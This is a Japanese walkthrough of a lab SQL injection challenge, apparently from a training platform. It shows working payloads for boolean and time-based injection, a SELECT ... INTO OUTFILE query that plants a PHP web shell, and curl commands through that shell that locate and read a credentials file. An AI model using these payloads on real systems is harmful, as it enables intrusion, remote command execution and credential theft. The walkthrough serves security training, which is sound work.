---
created: 2026-01-09 14:54
modified: 2026-01-17 18:35
environment:
  - Server/DB
vulnearability:
  - SQLi
type: pentest-walkthrough
pentest_category: Web
platform:
  - PurpleFlair
tools: []
cve: []
tags:
---
# [Pentest-Walkthrough] Web - Project: SQLインジェクション攻撃検証3

あなたの会社で管理しているサーバに保存されていたファイルが漏洩したことがわかりました。漏洩したファイルは、サーバの管理者情報を記載していたファイルusers.csvです。

ホームページでは、商品を検索する機能しか提供しておらず、漏洩したファイルは外部に公開していなかったことから、漏洩は考えにくいとのことでした。 しかし、調査の結果、該当のWebサイトにSQLインジェクション脆弱性が存在し、これを通じてファイルに書き込みが可能であることが判明しました。

SQLインジェクション脆弱性について調査し、その脆弱性を利用して、users.csvからユーザー名adminのパスワードを解答してください。

### 脆弱性の特定

この問題のWebサイトには、SQLインジェクション脆弱性があります。

まず、Webサイトにアクセスすると、商品一覧と商品を検索するための入力ボックスがあります。試しに、商品一覧に含まれている商品名や存在していない商品名を入力してみます。

商品名が存在しない場合、検索した商品が存在しないといったメッセージのみが表示されます。

次に、受け付けた入力を用いて、どのようなSQL文が作られているかについて考えてみましょう。 商品一覧に表示されている商品名の一部を削除した場合、検索に失敗してしまうことから、商品名を完全一致で検索していると考えられます。以上を踏まえると、次のようなSQL文が作られていると考えられます。

```
SELECT <在庫を表すカラム名> FROM <商品情報のテーブル名> WHERE <商品名を表すカラム名> = '<入力文字列>';
```

ここで、問題文よりSQLインジェクションの脆弱性の存在が示されているため、次のような入力を試してみます。

```
青い花瓶' AND '1'='1 
```

この入力により、以下のようなSQL文が生成されると考えられます。

```
SELECT <在庫を表すカラム名> FROM <商品情報のテーブル名> WHERE <商品名を表すカラム名> = '青い花瓶' AND '1'='1';
```

この結果、青い花瓶が出力されることから、入力値青い花瓶' AND '1'='1が上記のSQL文として解釈されているため、SQLインジェクションが存在することがわかります。

データベースの特定

次にアプリケーションが使用しているデータベースを特定します。

先程用いた入力からシングルクォートを1つ削除した、不完全なSQL文を構成する入力を試してみます。

```
青い花瓶' AND '1='1
```

入力した結果、検索した商品が存在しないといったメッセージのみが表示されます。 そのため、エラー文は出力されない仕様となっていることがわかります。

エラー文からデータベースを特定することが難しいため、SLEEP関数を使用します。 SLEEP関数は、引数により指定された秒数だけスリープ状態にします。以下に代表的なデータベースにおけるSLEEP関数を示します。

- Oracle
	- dbms_pipe.receive_message((<pipe_name>), )
- Microsoft
	- WAITFOR DELAY '0:0:'
- PostgreSQL
	- SELECT pg_sleep()
- MySQL
	- SELECT SLEEP()

SLEEP関数の実行が成功した場合、データベースがSLEEP状態となり、指定した秒数だけアプリケーションからのレスポンスが遅くなります。 データベースによってSLEEP関数が異なることから、SLEEP状態に成功した文字列をもとに、データベースを特定できます。

次のような入力を試してみます。

```
'; SELECT sleep(10); #
```

送信した文字列によって以下のSQL文が生成され、#によって以降の文字列をコメントアウトしています。 アプリケーション側のSQL文の文末にSQLクエリの終端を表す';が存在すると推測できるため、#を入力文字列の最後に追加し構文エラーを防ぎます。

```
SELECT <在庫を表すカラム名> FROM <商品情報のテーブル名> WHERE <商品名を表すカラム名> = ''; SELECT SLEEP(10) #';
```

この結果、アプリケーションからのレスポンスが指定した秒数だけ遅くなることが確認できたため、データベースにはMySQLが使用されていることが分かります。

### WebShellの作成

それでは、システムコマンドを実行するためにWebShellを作成しましょう。

MySQLには、SELECT ... INTOステートメントのOUTFILEによって、クエリ結果をファイルに書き込むことが可能です。そのため、これを利用し、WebShellをサーバ上に作成できます。

`https://dev.mysql.com/doc/refman/8.0/ja/select-into.html`

試しに以下を実行してみましょう。

```
'; SELECT 'hello world' INTO OUTFILE '/tmp/temp' from mysql.user limit 1; #
```

この結果、SQL文としては<商品名を表すカラム名> = ''を検索したと認識され、商品が存在しないというメッセージが表示されます。そのため、実行成否を判断できません。

レスポンスヘッダやファイル名の情報から、PHPおよびApacheが動作していることが分かります。そのため、/var/www/html配下でアプリケーションが稼働していると推測可能です。

そこで、/var/www/html配下にPHPファイルを作成し、URLパスに作成したPHPファイル名を指定することでWebアクセスを可能にします。

問題の答えはusers.csvに存在することがわかっています。ファイルを参照可能にするために、クエリパラメータcmdで受け取った文字列をコマンドとして実行するファイルshell.phpを作成します。

```
'; SELECT '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' INTO OUTFILE '/var/www/html/shell.php' from mysql.user limit 1;
```

ブラウザやcurlをもちいて以下のURLにアクセスします。この結果、lsコマンドによってカレントディレクトリのファイル名が出力されていることから、shell.phpの作成に成功したことがわかります。

```
curl "http://<target1_ip>/shell.php?cmd=ls"
```
<pre>assets
index.php
search.php
shell.php
style.css
</pre>

### 脆弱性の利用

問題の答えは、users.csvに存在することはわかっていますが、パスがわかっていません。 そのため、findコマンドを使用し、users.csvのパスを検索します。

```
curl "http://<target1_ip>/shell.php?cmd=find+/+-type+f+-name+'users.csv'"
```

この結果、ファイルのパスは/tmp/secret/users.csvであることがわかります。 catコマンドを使用し、ファイルを閲覧します。

```
curl "http://<target1_ip>/shell.php?cmd=cat+/tmp/secret/users.csv"
```
<pre>name,email,password
test_user,test@test.co.jp,awragwaw3e
admin,admin@test.co.jp,dHj44@Cj63E4oGy5oNQc
</pre>

問題の答えは、ユーザー名adminのパスワードであることから、dHj44@Cj63E4oGy5oNQcとなります。